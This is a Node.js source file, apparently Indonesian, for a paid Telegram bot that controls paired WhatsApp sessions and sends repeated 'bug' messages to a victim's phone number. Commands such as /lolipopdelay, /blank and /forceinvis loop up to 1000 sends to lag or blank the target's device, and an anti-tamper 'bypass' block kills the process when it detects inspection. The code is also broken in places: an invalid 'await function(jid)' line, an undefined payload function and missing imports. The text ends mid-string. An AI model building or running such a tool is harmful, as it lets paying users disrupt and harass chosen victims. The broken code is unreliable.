(async () => {
const {
  default: makeWASocket,
  useSingleFileAuthState,
  useMultiFileAuthState,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  areJidsSameUser,
  jidDecode,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  proto,
  BufferJSON,
  getContentType,
  makeInMemoryStore,
  initInMemoryKeyStore,
  MediaType,
  Mimetype,
  WA_MESSAGE_STUB_TYPES,
  WA_MESSAGE_STATUS_TYPE,
  WAMessageStatus,
  WASocket,
  WAProto,
  fetchLatestBaileysVersion,
  Browser,
  Browsers,
  GroupMetadata,
  WAGroupMetadata,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  WALocationMessage,
  URL_REGEX,
  WAUrlInfo,
  templateMessage,
  InteractiveMessage,
  Header,
  relayWAMessage,
  MediaConnInfo,
  WAMediaUpload,
  ProxyAgent,
  WA_DEFAULT_EPHEMERAL,
  MessageOptions,
  MiscMessageGenerationOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WAContextInfo,
  processTime,
  getStream,
  mentionedJid,
  GroupSettingChange,
  DisconnectReason,
  MessageType,
  Presence,
  isBaileys,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const readline = require("readline");
const JsConfuser = require("js-confuser");
const moment = require("moment-timezone");
const { exec } = require("child_process");
const util = require("util");

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./データベース/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./データベース/admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

//IMPOR

ensureFileExists("./データベース/premium.json");
ensureFileExists("./データベース/admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./データベース/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./データベース/admin.json", JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./データベース/premium.json", (data) => (premiumUsers = data));
watchFile("./データベース/admin.json", (data) => (adminUsers = data));

const TelegramBot = require("node-telegram-bot-api");

const userStates = {};

const config = require("./設定/config.js");

const BOT_TOKEN = config.BOT_TOKEN;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function showBanner() {
  const bannerText = figlet.textSync("Traz Invictus", {
    font: "Slant",
    horizontalLayout: "default",
  });
  console.log(gradient.fruit.multiline(bannerText));
}

function startBot() {
  console.log(chalk.greenBright("🚀 Siap, Bot Telegram telah aktif! 🧋"));
  console.log(chalk.blueBright("📌 Gunakan perintah melalui Telegram untuk memulai petualanganmu."));
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} nomor aktif di daftar *List Nomor* 📜`);

      for (const botNumber of activeNumbers) {
        console.log(`⚔️ Menghubungkan Shinobi WhatsApp: ${botNumber}...`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`${botNumber} berhasil terhubung`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`🔁 Mengulangi sambungan untuk ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Sambungan Terputus."));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Kesalahan saat mengaktifkan koneksi:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  const statusMessage = await bot.sendMessage(
    chatId,
    `
╭━━━[ MENYAMBUNGKAN ]━━━⬣
┃Nomor  : ${botNumber}
┃Status  : Pairing Will be connected
╰━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
    { parse_mode: "Markdown" }
  ).then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
╭━━━[ MENYAMBUNG ULANG]━━━⬣
┃ Nomor : ${botNumber}
┃ Status : Gagal,Menyambungkan
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
╭━━━[ SAMBUNGAN GAGAL ]━━━⬣
┃Nomor : ${botNumber}
┃Status : Koneksi gagal
╰━━━━━━━━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (err) {
          console.error("Gagal menghancurkan folder roh sesi:", err);
        }
      }
    }

    else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
╭━━━[ TERHUBUNG ]━━━⬣
┃Nomor     : ${botNumber}
┃Status    : Koneksi berhasil!
╰━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
        { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
      );
    }

    else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "XATABELA");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
╭━━━[ KODE TAUTAN ]━━━⬣
┃Nomor : ${botNumber}
┃Kode : ${formattedCode}
╰━━━━━━━━━━━━━━━━━━━⬣`,
            { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Gagal memperoleh *seimei no code*:", error);
        await bot.editMessageText(
          `
╭━━━[ KODE GAGAL ]━━━⬣
┃Nomor : ${botNumber}
┃Pesan : ${error.message}
╰━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return "Premium Akses";
  } else {
    return "No Akses";
  }
}

//TEMPAT PASANG BYPASS
const { env, execArgv } = process;
const mod = require('module');

const trueAbort = process.abort;
const trueExit = process.exit;
const trueToString = Function.prototype.toString.toString();

Object.defineProperty(process, 'abort', {
  value: trueAbort,
  configurable: false,
  writable: false,
  enumerable: true
});
Object.defineProperty(process, 'exit', {
  value: trueExit,
  configurable: false,
  writable: false,
  enumerable: true
});

Object.freeze(Function.prototype);
Object.freeze(axios.interceptors.request);
Object.freeze(axios.interceptors.response);

if (Function.prototype.toString.toString() !== trueToString) {
  console.error('[SECURITY] Function.prototype.toString dibajak!');
  process.kill(process.pid, 'SIGKILL');
}

if (execArgv.length === 0 && process.execArgv !== execArgv) {
  console.error('[SECURITY] process.execArgv dipalsukan!');
  process.kill(process.pid, 'SIGKILL');
}

['HTTP_PROXY', 'HTTPS_PROXY', 'NODE_TLS_REJECT_UNAUTHORIZED', 'NODE_OPTIONS'].forEach((key) => {
  if (env[key] && env[key] !== '' && env[key] !== '1') {
    console.error(`[SECURITY] ENV ${key} disuntik: ${env[key]}`);
    process.kill(process.pid, 'SIGKILL');
  }
});

if (
  axios.interceptors.request.handlers.length > 0 ||
  axios.interceptors.response.handlers.length > 0
) {
  console.error('[SECURITY] Interceptor axios terdeteksi!');
  process.kill(process.pid, 'SIGKILL');
}

const modCode = mod._load.toString();
if (!modCode.includes('tryModuleLoad') && !modCode.includes('Module._load')) {
  console.error('[SECURITY] Module._load dibajak!');
  process.kill(process.pid, 'SIGKILL');
}

try {
  const trap = typeof require.cache.get === 'function';
  if (trap) {
    console.error('[SECURITY] require.cache diproxy!');
    process.kill(process.pid, 'SIGKILL');
  }
} catch {
  console.error('[SECURITY] require.cache error');
  process.kill(process.pid, 'SIGKILL');
}

console.log('BYPASS DIACTIVEKAN ./XATANICAL');

// Get Random Image
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/1y89uo.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
// /start command dengan efek teks bergantian dan menu rapi
bot.onText(/\/start/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : "";

    const premiumStatus = getPremiumStatus(userId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
    const delay = ms => new Promise(res => setTimeout(res, ms));

    // Efek teks bergantian
    let tempMsg = await bot.sendMessage(chatId, "Welcome to");
    await delay(1200);
    await bot.deleteMessage(chatId, tempMsg.message_id);

    tempMsg = await bot.sendMessage(chatId, "X-Angel Invictus");
    await delay(1200);
    await bot.deleteMessage(chatId, tempMsg.message_id);

    tempMsg = await bot.sendMessage(chatId, `Owners : @Xatanicvxii`);
    await delay(1500);
    await bot.deleteMessage(chatId, tempMsg.message_id);

    // Kirim menu utama
    await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>X-ANGEL INVICTUS</blockquote>

≈ Users : ${username}
≈ Status：${premiumStatus}  
≈ Runtime：${runtime}  
≈ Version: 25.0

<blockquote>Owners : @Xatanicvxii</blockquote>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Murbug", callback_data: "bug_menu" },
            { text: "Owner Menu", callback_data: "owner_menu" }
          ],
          [
            { text: "Admin Menu", callback_data: "admin_menu" },
            { text: "Channel", url: "https://t.me/infoTredict" }
          ]
        ]
      }
    });

  } catch (error) {
    console.error("❌ エラー (/start):", error);
  }
});


// Handler tombol menu
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const username = query.from.username ? `@${query.from.username}` : "ユーザー名がありません";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug_menu") {
      caption = `
<blockquote>*XANGEL-INVICTUS*</blockquote>

≈ USERS: ${username}
≈ VERSION：25.0
≈ REALTIME：${runtime}

 ≈TOOLS BUG MENU≈
• /lolipopdelay 628××  
• /blank 628××
• /durationdelay 628××,1
• /forceinvis 628×× [iPhone]

<blockquote>X-ANGEL INVICTUS
VERSION：25.0</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "KEMBALI", callback_data: "back" }]] };
    }

    if (query.data === "owner_menu") {
      caption = `
<blockquote>X-ANGEL INVICTUS</blockquote>

≈ USERS: ${username}
≈ VERSION：25.0
≈ REALTIME：${runtime}

 ≈OWNERS SETTINGS≈：
・/addadmin  
・/deladmin  
・/connect

<blockquote>X-ANGEL INVICTUS
VERSION：25.0</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "KEMBALI", callback_data: "back" }]] };
    }

    if (query.data === "admin_menu") {
      caption = `
<blockquote>*X-ANGEL INVICTUS*</blockquote>

≈ USERS: ${username}
≈ VERSION：25.0
≈ REALTIME：${runtime}

 ≈ADMIN MENU≈：
・/addprem  
・/delprem

<blockquote>X-ANGEL INVICTUS 
VERSION：25.0</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "KEMBALI", callback_data: "back" }]] };
    }

    if (query.data === "back") {
      caption = `
<blockquote>X-ANGEL INVICTUS</blockquote>

≈ Users : ${username}
≈ Status：${premiumStatus}  
≈ Runtime：${runtime}  
≈ Version: 25.0

<blockquote>Owners : @Xatanicvxii</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Murbug", callback_data: "bug_menu" },
            { text: "Owners Menu", callback_data: "owner_menu" }
          ],
          [
            { text: "Admin Menu", callback_data: "admin_menu" },
            { text: "Channel", url: "https://t.me/infoTredict" }
          ]
        ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("❌ エラー (callback_query):", error);
  }
});
//─ ( Case Plugin ) ─
bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "*⛔ AKSES DITOLAK!*\n\n⚠️ Anda *tidak memiliki izin* untuk menggunakan perintah ini.\n\nSilakan hubungi admin untuk informasi lebih lanjut.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
  }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❗ *Missing Input!*\n\nFormat:\n`/addprem <user_id> <duration>`\n\nExample:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❗ *Missing Input!*\n\nFormat:\n`/addprem <user_id> <duration>`\n\nExample:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Duration Not Provided!*\n\nYou need to specify how long the premium access should last.\n\n💬 Example:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Format Durasi Tidak Valid!*\n\nGunakan angka diikuti oleh huruf:\n• `d` = hari\n• `h` = jam\n• `m` = menit\n\n📌 Contoh: `30d`, `12h`, `45m`",
      { parse_mode: "Markdown" }
    );
  }

  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d" ? "days" : duration.slice(-1) === "h" ? "hours" : "minutes"
  );

  const existingUser = premiumUsers.find((user) => user.id === userId);

  if (!existingUser) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format("YYYY-MM-DD HH:mm:ss")}`);
    bot.sendMessage(
      chatId,
      `✅ *Success!*\n\nUser ${userId} has been added to the *premium list*.\n⏳ Active until: *${expirationDate.format("YYYY-MM-DD HH:mm:ss")}*`,
      { parse_mode: "Markdown" }
    );
  } else {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `♻️ *Premium Extended!*\n\nUser ${userId} is already a premium member.\n📅 New expiration date: *${expirationDate.format("YYYY-MM-DD HH:mm:ss")}*`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nPlease provide a *user ID* to proceed.\n\n📌 Example:\n`/addadmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Invalid Input!*\n\nPlease enter a valid *user ID*.\n\n📌 Example:\n`/addadmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ *Success!*\n\nUser ${userId} has been added as an *admin*.`, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `🛡️ *Access Denied!*\n\nUser ${userId} is *already an admin*.\nThey’re standing guard`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "🔒 *Access Denied!*\n\nYou are *not authorized* to remove premium users.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nPlease provide a valid *user ID*.\n\n📌 Example:\n`/delprem 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Invalid Input!*\n\nUser ID must be a *number only*.\n\n📌 Example:\n`/delprem 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `⚠️ *Premium Status Check Failed!*\n\nUser ${userId} is *not listed as premium*.`,
      { parse_mode: "Markdown" }
    );
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `*Delete Premium!*\n\nUser ${userId} has been removed from the *premium users list*.`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nYou need to provide a valid *user ID*.\n\n📌 Example:\n`/deladmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "*That doesn't look right.*\n\nUse the correct format:\n`/deladmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ *Success!*\n\nUser ${userId} has been *removed from the admin list*.`, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `❌ *User ${userId} is not listed as an admin.*`, { parse_mode: "Markdown" });
  }
});

//─ ( Case Bug ) 
bot.onText(/\/lolipopdelay(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owners: @Xatanicvxii
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/xatanicvxii" }],
          [
            { text: "Channel", url: "https://t.me/infoTredict" },
            { text: "Room Public", url: "https://t.me/publicxata" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /BlackoutStrike 62xxxxxxxxxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ USERS : ${jid}
│ ACTIVE : ${sessions.size}
│ STATUS : INSTALLING TARGET BUG
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 LAG LOCKED SIGNAL 」─╮
│USERS : ${jid}
│SIGNAL : LAG NO CHAT
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│USERS : ${jid}
│STATUS : SUCCESS LAG SIGNAL
│OWNERS : @Xatanicvxii
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 1000; i++) {
    await function(jid);
    await new Promise(resolve => setTimeout(resolve, 1500));
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/blank(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owners: @Xatanicvxii
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/xatanicvxii" }],
          [
            { text: "Channel", url: "https://t.me/infoTredict" },
            { text: "Room Public", url: "https://t.me/publicxata" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /BlackoutStrike 62xxxxxxxxxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ USERS : ${jid}
│ ACTIVE : ${sessions.size}
│ STATUS : INSTALLING TARGET BUG
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 Lock Device WhatsApp 」─╮
│USERS : ${jid}
│SIGNAL : Blank Device 
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│USERS : ${jid}
│STATUS : SUCCESS Blank Device 
│OWNERS : @Xatanicvxii
╰─────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 10; i++) {
    await LolipopBlank(sock, jid);
    await new Promise(resolve => setTimeout(resolve, 1500));
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/forceinvis(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owner: @xatanicvxii
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/xatanicvxii" }],
          [
            { text: "Channel", url: "https://t.me/infoTredict" },
            { text: "Room Public", url: "https://t.me/publicxata" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /forceinvis 62xxxxxxxxxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ USERS : ${jid}
│ ACTIVE : ${sessions.size}
│ STATUS : Loading Force Invisible
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 Lock Device WhatsApp 」─╮
